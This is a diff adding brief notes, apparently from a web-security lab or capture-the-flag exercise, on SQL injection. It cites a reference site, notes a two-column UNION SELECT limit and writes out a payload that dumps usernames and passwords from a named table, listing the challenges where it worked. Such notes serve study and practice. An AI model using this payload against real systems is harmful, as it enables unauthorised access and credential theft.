@@ -1,0 +1,16 @@
+https://www.sqlinjection.net/table-names/
+
+
+
+with UNION SELECT => can only select 2 columns max
+
+ 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default
+
+
+used for :
+	03_add_image
+	01_login
+	07_members
+
+
+
